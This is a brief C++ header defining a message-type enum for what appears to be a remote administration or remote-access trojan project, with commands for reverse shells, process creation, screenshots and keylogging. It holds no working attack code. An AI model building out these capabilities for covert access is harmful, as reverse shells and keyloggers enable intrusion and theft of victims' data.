#pragma once

enum class MessageType : char
{
	Chat,
	Ping,
	CreateProcessS,
	StartReverseShell,
	ReverseShellMessage,
	StopReverseShell,
	TakeScreenshot,
	Screenshot,
	StartKeyLog,
	KeyLogMessage,
	StopKeyLog
};